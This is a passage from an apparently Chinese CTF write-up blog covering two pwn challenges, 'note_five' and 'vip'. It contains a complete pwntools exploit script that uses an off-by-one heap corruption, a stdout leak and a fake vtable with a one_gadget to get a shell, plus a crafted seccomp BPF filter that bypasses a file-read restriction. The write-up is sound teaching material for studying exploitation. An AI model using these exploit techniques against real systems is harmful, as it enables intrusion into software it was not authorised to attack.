<h2 id="note-five"><a href="#note-five" class="headerlink" title="note_five"></a>note_five</h2><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>看着17师傅的exp复现了一遍。程序有off-by-one，禁用了fastbin，上来先构造overlapchunk，unsorted bin修改global_max_fast，之后可以使用smallbin。在stdout前寻找合适size的fake_chunk，这里用的是stderr的flag字段的0xfb作为size，分配0xe8的堆块到这里，之后再往后构造一个fake_chunk，从而得以覆写stdout，泄露libc。拿shell的方法是构造fake_vtable(之前的数据照抄，0xd8处改成伪造的vtable地址，使得__xsputn=one_gadget即可)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p* (struct _IO_jump_t *)0x7ffff7dd26c8</span><br><span class="line">__dummy = 0x0, </span><br><span class="line">__dummy2 = 0x0, </span><br><span class="line">__finish = 0x0, </span><br><span class="line">__overflow = 0xffffffff, </span><br><span class="line">__underflow = 0x0, </span><br><span class="line">__uflow = 0x0, </span><br><span class="line">__pbackfail = 0x7ffff7dd26c8 &lt;_IO_2_1_stdout_+168&gt;, </span><br><span class="line">__xsputn = 0x7ffff7afe147 &lt;exec_comm+2263&gt;, </span><br><span class="line">__xsgetn = 0x7ffff7afe147 &lt;exec_comm+2263&gt;, </span><br><span class="line">__seekoff = 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;, </span><br><span class="line">__seekpos = 0x7ffff7a2db70 &lt;__gcc_personality_v0&gt;, </span><br><span class="line">__setbuf = 0x0, </span><br><span class="line">__sync = 0x0, </span><br><span class="line">__doallocate = 0x0, </span><br><span class="line">__read = 0x0, </span><br><span class="line">__write = 0x0, </span><br><span class="line">__seek = 0x0, </span><br><span class="line">__close = 0x0, </span><br><span class="line">__stat = 0x0,                                           __showmanyc = 0x0,                                      __imbue = 0x0</span><br></pre></td></tr></table></figure>
<h3 id="exp-py-2"><a href="#exp-py-2" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./note_five'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">global_max_fast = <span class="number">0x3c67f8</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./note_five'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'content: '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Add(<span class="number">0</span>,<span class="number">0xf8</span>)<span class="comment">#0</span></span><br><span class="line">    Add(<span class="number">1</span>,<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">    Add(<span class="number">2</span>,<span class="number">0xf8</span>)<span class="comment">#2</span></span><br><span class="line">    Add(<span class="number">3</span>,<span class="number">0xf8</span>)<span class="comment">#3</span></span><br><span class="line">    Add(<span class="number">4</span>,<span class="number">0xf8</span>)<span class="comment">#4</span></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">2</span>,<span class="string">'\x00'</span>*<span class="number">0xf0</span>+p64(<span class="number">0x100</span>*<span class="number">3</span>)+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">3</span>)<span class="comment">#0 &amp; 1 &amp; 2 &amp; 3</span></span><br><span class="line">    Add(<span class="number">0</span>,<span class="number">0xe0</span>)<span class="comment">#0</span></span><br><span class="line">    Add(<span class="number">0</span>,<span class="number">0x108</span>)<span class="comment">#0 overlap 1</span></span><br><span class="line">    <span class="comment">#Add(0,0xf8)#0</span></span><br><span class="line">    <span class="comment">#Add(0,0xf8)#0 == 1</span></span><br><span class="line">    Edit(<span class="number">2</span>,p64(<span class="number">0</span>)+<span class="string">'\xe8\x37\n'</span>)</span><br><span class="line">    Add(<span class="number">3</span>,<span class="number">0x1f8</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+<span class="string">'\x00'</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+<span class="string">'\x3b\x25\n'</span>)</span><br><span class="line">    Add(<span class="number">1</span>,<span class="number">0xe8</span>)</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">4</span>,<span class="number">0xe8</span>)<span class="comment">#target</span></span><br><span class="line">    payload = <span class="string">'\x00'</span>*(<span class="number">0xe0</span><span class="number">-19</span>)+p64(<span class="number">0x101</span>)+p64(<span class="number">0xfbad1800</span>)+<span class="string">'\n'</span></span><br><span class="line">    Edit(<span class="number">4</span>,payload)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+<span class="string">'\x10\x26\n'</span></span><br><span class="line">    Edit(<span class="number">0</span>,payload)</span><br><span class="line">    Add(<span class="number">1</span>,<span class="number">0xf8</span>)</span><br><span class="line">    Add(<span class="number">4</span>,<span class="number">0xf8</span>)</span><br><span class="line">    payload = p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00\n'</span></span><br><span class="line">    Edit(<span class="number">4</span>,payload)</span><br><span class="line">    p.recvuntil(<span class="string">'\x00\x18\xad\xfb'</span>)</span><br><span class="line">    p.recvn(<span class="number">28</span>)</span><br><span class="line">    libc_base = u64(p.recvn(<span class="number">8</span>)) - (<span class="number">0x7ffff7dd2600</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    stdout = libc_base + (<span class="number">0x00007ffff7dd2620</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">    one_gadget = <span class="number">0xf1147</span></span><br><span class="line">    fake_file = p64(<span class="number">0xfbad2887</span>)+p64(libc.sym[<span class="string">'_IO_2_1_stdin_'</span>]+<span class="number">131</span>)*<span class="number">7</span>+p64(libc.sym[<span class="string">'_IO_2_1_stdout_'</span>]+<span class="number">132</span>)</span><br><span class="line">    fake_file += p64(<span class="number">0</span>)*<span class="number">4</span>+p64(libc.sym[<span class="string">'_IO_2_1_stdin_'</span>])+p64(<span class="number">1</span>)+p64(<span class="number">0xffffffffffffffff</span>)+p64(<span class="number">0x000000000b000000</span>)+p64(libc_base+(<span class="number">0x7ffff7dd3780</span><span class="number">-0x7ffff7a0d000</span>))</span><br><span class="line">    fake_file += p64(<span class="number">0xffffffffffffffff</span>)+p64(<span class="number">0</span>)+p64(libc.address+(<span class="number">0x7ffff7dd17a0</span><span class="number">-0x7ffff7a0d000</span>))+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x00000000ffffffff</span>)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    fake_file += p64(stdout+<span class="number">0xd8</span><span class="number">-0x30</span>)+p64(libc_base+one_gadget)*<span class="number">2</span>+<span class="string">'\n'</span></span><br><span class="line"></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">4</span>,fake_file)</span><br><span class="line">    </span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="vip"><a href="#vip" class="headerlink" title="vip"></a>vip</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>第一次做seccomp类的题目，考察bpf的规则编写.</p>
<h3 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>Edit函数里可以修改0x4040e0进行溢出写，也可以通过一些方法改open函数的返回值为0进行溢出写，这里利用的就是seccomp的filter修改系统调用的返回值为errno(0)。根据manual可以知道这个调用是把code作为errno的值返回给用户(并不执行系统调用)<br><code>SECCOMP_RET_ERRNO
              This value results in the SECCOMP_RET_DATA portion of the fil‐
              ter&#39;s return value being passed to user space as the errno
              value without executing the system call.</code><br>因此我们用以下规则可以进行如上的操作：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] = &#123;</span></span><br><span class="line">    BPF_STMT(BPF_LD|BPF_W|BPF_ABS, <span class="number">0</span>), <span class="comment">//A = sys_num  </span></span><br><span class="line">    BPF_JUMP(BPF_JMP|BPF_JEQ, <span class="number">257</span>, <span class="number">1</span>, <span class="number">0</span>), <span class="comment">// if A == 257, goto 4  else goto 3    </span></span><br><span class="line">    BPF_JUMP(BPF_JMP|BPF_JGE, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>), <span class="comment">// if A &gt;= 0,goto 4 else goto 3        </span></span><br><span class="line">    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ERRNO),</span><br><span class="line">    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">get_input</span><span class="params">(<span class="keyword">void</span> *ptr, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_4040E0 )</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, ptr, size);</span><br><span class="line">  fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> read(fd, ptr, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">BeVip</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [rsp+8h] [rbp-88h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+30h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+31h] [rbp-5Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+32h] [rbp-5Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+33h] [rbp-5Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+34h] [rbp-5Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+35h] [rbp-5Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+36h] [rbp-5Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+37h] [rbp-59h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+38h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [rsp+39h] [rbp-57h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+3Ah] [rbp-56h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+3Bh] [rbp-55h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+3Ch] [rbp-54h]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+3Dh] [rbp-53h]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [rsp+3Eh] [rbp-52h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [rsp+3Fh] [rbp-51h]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [rsp+40h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [rsp+41h] [rbp-4Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [rsp+42h] [rbp-4Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [rsp+43h] [rbp-4Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v24; <span class="comment">// [rsp+44h] [rbp-4Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// [rsp+45h] [rbp-4Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v26; <span class="comment">// [rsp+46h] [rbp-4Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// [rsp+47h] [rbp-49h]</span></span><br><span class="line">  <span class="keyword">char</span> v28; <span class="comment">// [rsp+48h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> v29; <span class="comment">// [rsp+49h] [rbp-47h]</span></span><br><span class="line">  <span class="keyword">char</span> v30; <span class="comment">// [rsp+4Ah] [rbp-46h]</span></span><br><span class="line">  <span class="keyword">char</span> v31; <span class="comment">// [rsp+4Bh] [rbp-45h]</span></span><br><span class="line">  <span class="keyword">char</span> v32; <span class="comment">// [rsp+4Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> v33; <span class="comment">// [rsp+4Dh] [rbp-43h]</span></span><br><span class="line">  <span class="keyword">char</span> v34; <span class="comment">// [rsp+4Eh] [rbp-42h]</span></span><br><span class="line">  <span class="keyword">char</span> v35; <span class="comment">// [rsp+4Fh] [rbp-41h]</span></span><br><span class="line">  <span class="keyword">char</span> v36; <span class="comment">// [rsp+50h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> v37; <span class="comment">// [rsp+51h] [rbp-3Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v38; <span class="comment">// [rsp+52h] [rbp-3Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v39; <span class="comment">// [rsp+53h] [rbp-3Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v40; <span class="comment">// [rsp+54h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v41; <span class="comment">// [rsp+55h] [rbp-3Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v42; <span class="comment">// [rsp+56h] [rbp-3Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v43; <span class="comment">// [rsp+57h] [rbp-39h]</span></span><br><span class="line">  <span class="keyword">char</span> v44; <span class="comment">// [rsp+58h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> v45; <span class="comment">// [rsp+59h] [rbp-37h]</span></span><br><span class="line">  <span class="keyword">char</span> v46; <span class="comment">// [rsp+5Ah] [rbp-36h]</span></span><br><span class="line">  <span class="keyword">char</span> v47; <span class="comment">// [rsp+5Bh] [rbp-35h]</span></span><br><span class="line">  <span class="keyword">char</span> v48; <span class="comment">// [rsp+5Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> v49; <span class="comment">// [rsp+5Dh] [rbp-33h]</span></span><br><span class="line">  <span class="keyword">char</span> v50; <span class="comment">// [rsp+5Eh] [rbp-32h]</span></span><br><span class="line">  <span class="keyword">char</span> v51; <span class="comment">// [rsp+5Fh] [rbp-31h]</span></span><br><span class="line">  <span class="keyword">char</span> v52; <span class="comment">// [rsp+60h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v53; <span class="comment">// [rsp+61h] [rbp-2Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v54; <span class="comment">// [rsp+62h] [rbp-2Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v55; <span class="comment">// [rsp+63h] [rbp-2Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v56; <span class="comment">// [rsp+64h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v57; <span class="comment">// [rsp+65h] [rbp-2Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v58; <span class="comment">// [rsp+66h] [rbp-2Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v59; <span class="comment">// [rsp+67h] [rbp-29h]</span></span><br><span class="line">  <span class="keyword">char</span> v60; <span class="comment">// [rsp+68h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v61; <span class="comment">// [rsp+69h] [rbp-27h]</span></span><br><span class="line">  <span class="keyword">char</span> v62; <span class="comment">// [rsp+6Ah] [rbp-26h]</span></span><br><span class="line">  <span class="keyword">char</span> v63; <span class="comment">// [rsp+6Bh] [rbp-25h]</span></span><br><span class="line">  <span class="keyword">char</span> v64; <span class="comment">// [rsp+6Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> v65; <span class="comment">// [rsp+6Dh] [rbp-23h]</span></span><br><span class="line">  <span class="keyword">char</span> v66; <span class="comment">// [rsp+6Eh] [rbp-22h]</span></span><br><span class="line">  <span class="keyword">char</span> v67; <span class="comment">// [rsp+6Fh] [rbp-21h]</span></span><br><span class="line">  <span class="keyword">char</span> v68; <span class="comment">// [rsp+70h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v69; <span class="comment">// [rsp+71h] [rbp-1Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v70; <span class="comment">// [rsp+72h] [rbp-1Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v71; <span class="comment">// [rsp+73h] [rbp-1Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v72; <span class="comment">// [rsp+74h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v73; <span class="comment">// [rsp+75h] [rbp-1Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v74; <span class="comment">// [rsp+76h] [rbp-1Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v75; <span class="comment">// [rsp+77h] [rbp-19h]</span></span><br><span class="line">  <span class="keyword">char</span> v76; <span class="comment">// [rsp+78h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v77; <span class="comment">// [rsp+79h] [rbp-17h]</span></span><br><span class="line">  <span class="keyword">char</span> v78; <span class="comment">// [rsp+7Ah] [rbp-16h]</span></span><br><span class="line">  <span class="keyword">char</span> v79; <span class="comment">// [rsp+7Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">char</span> v80; <span class="comment">// [rsp+7Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v81; <span class="comment">// [rsp+7Dh] [rbp-13h]</span></span><br><span class="line">  <span class="keyword">char</span> v82; <span class="comment">// [rsp+7Eh] [rbp-12h]</span></span><br><span class="line">  <span class="keyword">char</span> v83; <span class="comment">// [rsp+7Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">char</span> v84; <span class="comment">// [rsp+80h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> v85; <span class="comment">// [rsp+81h] [rbp-Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v86; <span class="comment">// [rsp+82h] [rbp-Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v87; <span class="comment">// [rsp+83h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v88; <span class="comment">// [rsp+84h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v89; <span class="comment">// [rsp+85h] [rbp-Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v90; <span class="comment">// [rsp+86h] [rbp-Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v91; <span class="comment">// [rsp+87h] [rbp-9h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v92; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v92 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"OK, but before you become vip, please tell us your name: "</span>);</span><br><span class="line">  v4 = <span class="number">32</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">4</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">21</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">8</span>;</span><br><span class="line">  v16 = <span class="number">62</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  v18 = <span class="number">0</span>;</span><br><span class="line">  v19 = <span class="number">0xC0</span>u;</span><br><span class="line">  v20 = <span class="number">32</span>;</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">0</span>;</span><br><span class="line">  v27 = <span class="number">0</span>;</span><br><span class="line">  v28 = <span class="number">53</span>;</span><br><span class="line">  v29 = <span class="number">0</span>;</span><br><span class="line">  v30 = <span class="number">6</span>;</span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  v35 = <span class="number">64</span>;</span><br><span class="line">  v36 = <span class="number">21</span>;</span><br><span class="line">  v37 = <span class="number">0</span>;</span><br><span class="line">  v38 = <span class="number">4</span>;</span><br><span class="line">  v39 = <span class="number">0</span>;</span><br><span class="line">  v40 = <span class="number">1</span>;</span><br><span class="line">  v41 = <span class="number">0</span>;</span><br><span class="line">  v42 = <span class="number">0</span>;</span><br><span class="line">  v43 = <span class="number">0</span>;</span><br><span class="line">  v44 = <span class="number">21</span>;</span><br><span class="line">  v45 = <span class="number">0</span>;</span><br><span class="line">  v46 = <span class="number">3</span>;</span><br><span class="line">  v47 = <span class="number">0</span>;</span><br><span class="line">  v48 = <span class="number">0</span>;</span><br><span class="line">  v49 = <span class="number">0</span>;</span><br><span class="line">  v50 = <span class="number">0</span>;</span><br><span class="line">  v51 = <span class="number">0</span>;</span><br><span class="line">  v52 = <span class="number">21</span>;</span><br><span class="line">  v53 = <span class="number">0</span>;</span><br><span class="line">  v54 = <span class="number">2</span>;</span><br><span class="line">  v55 = <span class="number">0</span>;</span><br><span class="line">  v56 = <span class="number">2</span>;</span><br><span class="line">  v57 = <span class="number">0</span>;</span><br><span class="line">  v58 = <span class="number">0</span>;</span><br><span class="line">  v59 = <span class="number">0</span>;</span><br><span class="line">  v60 = <span class="number">21</span>;</span><br><span class="line">  v61 = <span class="number">0</span>;</span><br><span class="line">  v62 = <span class="number">1</span>;</span><br><span class="line">  v63 = <span class="number">0</span>;</span><br><span class="line">  v64 = <span class="number">60</span>;</span><br><span class="line">  v65 = <span class="number">0</span>;</span><br><span class="line">  v66 = <span class="number">0</span>;</span><br><span class="line">  v67 = <span class="number">0</span>;</span><br><span class="line">  v68 = <span class="number">6</span>;</span><br><span class="line">  v69 = <span class="number">0</span>;</span><br><span class="line">  v70 = <span class="number">0</span>;</span><br><span class="line">  v71 = <span class="number">0</span>;</span><br><span class="line">  v72 = <span class="number">5</span>;</span><br><span class="line">  v73 = <span class="number">0</span>;</span><br><span class="line">  v74 = <span class="number">5</span>;</span><br><span class="line">  v75 = <span class="number">0</span>;</span><br><span class="line">  v76 = <span class="number">6</span>;</span><br><span class="line">  v77 = <span class="number">0</span>;</span><br><span class="line">  v78 = <span class="number">0</span>;</span><br><span class="line">  v79 = <span class="number">0</span>;</span><br><span class="line">  v80 = <span class="number">0</span>;</span><br><span class="line">  v81 = <span class="number">0</span>;</span><br><span class="line">  v82 = <span class="number">-1</span>;</span><br><span class="line">  v83 = <span class="number">127</span>;</span><br><span class="line">  v84 = <span class="number">6</span>;</span><br><span class="line">  v85 = <span class="number">0</span>;</span><br><span class="line">  v86 = <span class="number">0</span>;</span><br><span class="line">  v87 = <span class="number">0</span>;</span><br><span class="line">  v88 = <span class="number">0</span>;</span><br><span class="line">  v89 = <span class="number">0</span>;</span><br><span class="line">  v90 = <span class="number">0</span>;</span><br><span class="line">  v91 = <span class="number">0</span>;</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello, %s\n"</span>, &amp;buf);</span><br><span class="line">  v1 = <span class="number">11</span>;</span><br><span class="line">  v2 = &amp;v4;</span><br><span class="line">  <span class="keyword">if</span> ( prctl(<span class="number">38</span>, <span class="number">1L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"prctl(PR_SET_NO_NEW_PRIVS)"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( prctl(<span class="number">22</span>, <span class="number">2L</span>L, &amp;v1) &lt; <span class="number">0</span> )                <span class="comment">// v1可以被修改</span></span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"prctl(PR_SET_SECCOMP)"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v92;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>改完之后ORW得到flag(很久没用这个了，注意fd默认是递增的，因此是0，1，2-&gt;3)，另外open函数的系统调用是openat，系统调用号为257，我们禁用它之后用opem(sys_num:0)来打开flag进行读取。</p>
